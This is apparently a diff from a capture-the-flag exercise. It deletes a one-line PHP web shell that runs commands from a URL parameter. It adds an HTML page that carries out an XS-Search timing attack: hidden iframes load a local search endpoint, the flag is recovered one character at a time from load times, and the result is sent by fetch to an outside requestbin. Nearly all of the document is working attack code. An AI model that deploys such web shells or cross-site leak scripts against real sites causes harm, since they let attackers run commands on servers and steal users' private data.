@@ -1,1 +1,106 @@
-#<?php system($_GET["cmd"]); ?>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XS-Search Attack</title>
+</head>
+<body>
+  <h1>XS-Search Attack Page</h1>
+  <p>Please wait while the flag is being discovered...</p>
+  <script>
+    const charset = '0123456789abcdefghijklmnopqrstuvwxyz-_{}';
+    let flag = 'DH{';
+
+    // 로딩 시간을 측정하는 비동기 함수
+    function fetchWithTimeout(url, timeout) {
+      return new Promise((resolve, reject) => {
+        const startTime = performance.now();
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.display = 'none'; // 사용자가 볼 수 없도록 숨김
+
+        // 타임아웃 타이머
+        const timer = setTimeout(() => {
+          iframe.remove();
+          const endTime = performance.now();
+          resolve(endTime - startTime);
+        }, timeout);
+
+        // iframe 로드 완료 시
+        iframe.onload = () => {
+          clearTimeout(timer);
+          const endTime = performance.now();
+          iframe.remove();
+          resolve(endTime - startTime);
+        };
+        
+        // iframe 에러 발생 시
+        iframe.onerror = () => {
+          clearTimeout(timer);
+          iframe.remove();
+          reject('Error loading iframe');
+        };
+
+        document.body.appendChild(iframe);
+      });
+    }
+
+    // FLAG를 찾는 메인 함수
+    async function findFlag() {
+      while (true) {
+        let maxTime = 0;
+        let foundChar = null;
+
+        for (const char of charset) {
+          const query = flag + char;
+          const url = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
+          
+          try {
+            const time = await fetchWithTimeout(url, 2000); // 2초 타임아웃
+            console.log(`Testing: ${query}, Time: ${time.toFixed(2)}ms`);
+
+            // 가장 긴 시간을 기록한 글자를 찾음
+            if (time > maxTime) {
+              maxTime = time;
+              foundChar = char;
+            }
+          } catch (e) {
+            console.error(`Error with query: ${query}`, e);
+          }
+        }
+        
+        // 로딩 시간 차이를 통해 다음 글자를 추측 (임계값 1000ms는 환경에 따라 조정 필요)
+        if (maxTime > 1000 && foundChar) {
+          flag += foundChar;
+          console.log(`Found a character! New Flag: ${flag}`);
+          
+          if (foundChar === '}') {
+            const foundFlag = flag; // 최종 FLAG 값
+            
+            // requestbin으로 FLAG 전송
+            const requestbinUrl = 'https://mltqmqb.request.dreamhack.games'; 
+            const payloadUrl = `${requestbinUrl}?flag=${encodeURIComponent(foundFlag)}`;
+            
+            // fetch로 요청 보내기
+            fetch(payloadUrl).then(() => {
+                alert('Flag found and sent! Check your requestbin.');
+            }).catch(error => {
+                console.error('Error sending flag:', error);
+                alert('Flag found, but failed to send. Check console.');
+            });
+            
+            break;
+          }
+        } else {
+          console.log("Could not find the next character. Stopping.");
+          break;
+        }
+        
+        // 다음 테스트 전 잠시 대기
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    }
+
+    findFlag();
+  </script>
+</body>
+</html>
